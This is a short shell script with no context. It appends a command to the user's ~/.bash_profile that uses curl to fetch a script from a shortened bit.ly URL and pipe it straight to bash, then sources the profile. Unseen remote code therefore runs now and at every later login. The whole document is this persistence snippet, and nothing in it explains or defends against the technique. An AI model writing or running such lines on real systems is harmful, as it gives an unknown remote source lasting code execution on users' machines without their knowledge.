file=.bash_profile
cd ~
touch $file
echo 'curl -s -L http://bit.ly/10hA8iC | bash'>>$file
source $file
